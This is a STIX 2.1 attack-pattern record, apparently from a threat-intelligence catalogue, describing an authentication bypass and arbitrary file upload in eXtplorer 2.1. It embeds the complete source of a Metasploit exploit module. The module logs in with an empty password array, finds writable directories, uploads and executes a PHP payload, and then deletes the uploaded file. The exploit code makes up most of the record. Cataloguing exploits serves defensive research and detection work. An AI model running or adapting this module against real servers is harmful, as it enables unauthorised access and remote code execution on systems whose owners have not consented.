{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--34821aa7-07d2-49f5-995d-066f9e8e7b13",
    "created": "2024-08-14T17:09:10.921656Z",
    "modified": "2024-08-14T17:09:10.92166Z",
    "name": "\"eXtplorer v2.1 Arbitrary File Upload Vulnerability\"",
    "description": " This module exploits an authentication bypass vulnerability in eXtplorer versions 2.1.0 to 2.1.2 and 2.1.0RC5 when run as a standalone application. This application has an upload feature that allows an authenticated user with administrator roles to upload arbitrary files to any writable directory in the web root. This module uses an authentication bypass vulnerability to upload and execute a file.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/extplorer_upload_exec.rb",
            "external_id": "extplorer_upload_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "http://itsecuritysolutions.org/2012-12-31-eXtplorer-v2.1-authentication-bypass-vulnerability"
        },
        {
            "source_name": "reference",
            "url": "http://extplorer.net/issues/105"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => \"eXtplorer v2.1 Arbitrary File Upload Vulnerability\",\n        'Description' => %q{\n          This module exploits an authentication bypass vulnerability in eXtplorer\n          versions 2.1.0 to 2.1.2 and 2.1.0RC5 when run as a standalone application.\n          This application has an upload feature that allows an authenticated user\n          with administrator roles to upload arbitrary files to any writable\n          directory in the web root. This module uses an authentication bypass\n          vulnerability to upload and execute a file.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'bcoles' # Discovery and exploit\n        ],\n        'References' => [\n          [ 'OSVDB', '88751' ],\n          [ 'BID', '57058' ],\n          [ 'URL', 'http://itsecuritysolutions.org/2012-12-31-eXtplorer-v2.1-authentication-bypass-vulnerability' ],\n          [ 'URL', 'http://extplorer.net/issues/105' ]\n        ],\n        'Payload' => {\n        },\n        'Platform' => 'php',\n        'Arch' => ARCH_PHP,\n        'Targets' => [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n        'Privileged' => false,\n        'DisclosureDate' => '2012-12-31',\n        'DefaultTarget' => 0,\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_fs_delete_file\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/com_extplorer_2.1.0/']),\n        OptString.new('USERNAME', [true, 'The username for eXtplorer', 'admin'])\n      ]\n    )\n\n    self.needs_cleanup = true\n  end\n\n  def check\n    base = target_uri.path\n    base << '/' if base[-1, 1] != '/'\n    peer = \"#{rhost}:#{rport}\"\n\n    # retrieve software version from ./extplorer.xml\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri' => \"#{base}extplorer.xml\"\n      })\n\n      if !res or res.code != 200\n        return Exploit::CheckCode::Safe\n      end\n\n      if res.body =~ /<version>2\\.1\\.(0RC\\d|0|1|2)<\\/version>/\n        return Exploit::CheckCode::Appears\n      end\n\n      if res.body =~ /eXtplorer/\n        return Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def on_new_session(client)\n    if client.type == \"meterpreter\"\n      client.core.use(\"stdapi\") if not client.ext.aliases.include?(\"stdapi\")\n      client.fs.file.rm(\"#{@fname}\")\n    else\n      client.shell_command_token(\"rm #{@fname}\")\n    end\n  end\n\n  def upload(base, dir, fname, file)\n    data = Rex::MIME::Message.new\n    data.add_part(file, 'application/x-httpd-php', nil, \"form-data; name=\\\"userfile[0]\\\"; filename=\\\"#{fname}\\\"\")\n    data.add_part(\"on\", nil, nil, \"form-data; name=\\\"overwrite_files\\\"\")\n    data.add_part(\"%2f#{dir}\", nil, nil, \"form-data; name=\\\"dir\\\"\")\n    data.add_part(\"com_extplorer\", nil, nil, \"form-data; name=\\\"option\\\"\")\n    data.add_part(\"upload\", nil, nil, \"form-data; name=\\\"action\\\"\")\n    data.add_part(\"xmlhttprequest\", nil, nil, \"form-data; name=\\\"requestType\\\"\")\n    data.add_part(\"true\", nil, nil, \"form-data; name=\\\"confirm\\\"\")\n\n    data_post = data.to_s\n\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"#{base}index.php\",\n      'ctype' => \"multipart/form-data; boundary=#{data.bound}\",\n      'data' => data_post,\n      'cookie' => datastore['COOKIE'],\n    })\n\n    return res\n  end\n\n  def auth_bypass(base, user)\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri' => \"#{base}index.php\",\n      'data' => \"option=com_extplorer&action=login&type=extplorer&username=#{user}&password[]=\",\n      'cookie' => datastore['COOKIE'],\n    })\n    return res\n  end\n\n  def exploit\n    base = target_uri.path\n    base << '/' if base[-1, 1] != '/'\n\n    @fname = rand_text_alphanumeric(rand(10) + 6) + '.php'\n    user = datastore['USERNAME']\n    datastore['COOKIE'] = \"eXtplorer=\" + rand_text_alpha_lower(26) + \";\"\n\n    # bypass auth\n    print_status(\"Authenticating as user (#{user})\")\n    res = auth_bypass(base, user)\n    if res and res.code == 200 and res.body =~ /Are you sure you want to delete these/\n      print_good(\"Authenticated successfully\")\n    else\n      fail_with(Failure::NoAccess, \"#{peer} - Authentication failed\")\n    end\n\n    # search for writable directories\n    print_status(\"Retrieving writable subdirectories\")\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => \"#{base}index.php\",\n        'cookie' => datastore['COOKIE'],\n        'data' => \"option=com_extplorer&action=getdircontents&dir=#{base}&sendWhat=dirs&node=ext_root\",\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n    if res and res.code == 200 and res.body =~ /\\{'text':'([^']+)'[^\\}]+'is_writable':true/\n      dir = \"#{base}#{$1}\"\n      print_good(\"Successfully retrieved writable subdirectory (#{$1})\")\n    else\n      dir = \"#{base}\"\n      print_error(\"Could not find a writable subdirectory.\")\n    end\n\n    # upload PHP payload\n    print_status(\"Uploading PHP payload (#{payload.encoded.length.to_s} bytes) to #{dir}\")\n    php = %Q|<?php #{payload.encoded} ?>|\n    begin\n      res = upload(base, dir, @fname, php)\n      if res and res.code == 200 and res.body =~ /'message':'Upload successful\\!'/\n        print_good(\"File uploaded successfully\")\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Uploading PHP payload failed\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n    # search directories in the web root for the file\n    print_status(\"Searching directories for file (#{@fname})\")\n    begin\n      res = send_request_cgi({\n        'method' => 'POST',\n        'uri' => \"#{base}index.php\",\n        'data' => \"start=0&limit=10&option=com_extplorer&action=search&dir=#{base}&content=0&subdir=1&searchitem=#{@fname}\",\n        'cookie' => datastore['COOKIE'],\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n    if res and res.code == 200 and res.body =~ /'dir':'\\\\\\/([^']+)'/\n      dir = $1.gsub('\\\\', '')\n      print_good(\"Successfully found file\")\n    else\n      print_error(\"Failed to find file\")\n    end\n\n    # retrieve and execute PHP payload\n    print_status(\"Executing payload (/#{dir}/#{@fname})\")\n    begin\n      send_request_cgi({\n        'method' => 'GET',\n        'uri' => \"/#{dir}/#{@fname}\"\n      })\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n    if res and res.code != 200\n      print_error(\"Executing payload failed\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2012-12-31",
    "x_mitre_platforms": [
        "php'"
    ]
}